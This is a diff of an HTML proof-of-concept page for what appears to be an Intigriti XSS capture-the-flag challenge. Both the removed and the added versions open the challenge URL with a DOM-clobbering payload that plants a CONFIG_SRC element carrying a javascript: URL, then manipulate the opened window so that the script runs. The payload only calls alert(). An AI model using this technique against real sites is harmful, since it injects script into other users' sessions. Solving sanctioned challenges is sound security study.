@@ -1,34 +1,13 @@
-<!DOCTYPE html>
 <html>
+
 <body>
-<script>
-    const payload = `</strong><div id=strong></div><div id=CONFIG_SRC data-url=javascript:alert(document.domain)>test</div><details open><summary>Click Me</summary></details>`;
-
-    const targetUrl = `https://challenge-0525.intigriti.io/begin?name=${encodeURIComponent(payload)}`;
-    const backUrl = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";
-
-    const w = window.open(targetUrl);
-
-    setTimeout(() => {
-        try { 
-            w.location = backUrl; 
-        } catch (e) {}
-    }, 3000);
-
-    const proactive = setInterval(() => {
-        try {
-            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
-                console.log("✅ Calling addDynamicScript...");
-                w.addDynamicScript();
-                clearInterval(proactive);
-            } else if (w.document?.getElementById('message')) {
-                // Trigger real DOM Mutation
-                const newNode = w.document.createElement('div');
-                newNode.innerText = "Forced Mutation Trigger";
-                w.document.getElementById('message').appendChild(newNode);
-            }
-        } catch (e) {}
-    }, 1000);
-</script>
+    <script>
+        let begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG%5FSRC%20data%2Durl%3Djavascript:alert()>test</div><strong>a"
+        let w = window.open(begin)
+        setTimeout(d => {
+            w.location = '/back.html?n=1'
+        }, 5000)
+    </script>
 </body>
+
 </html>
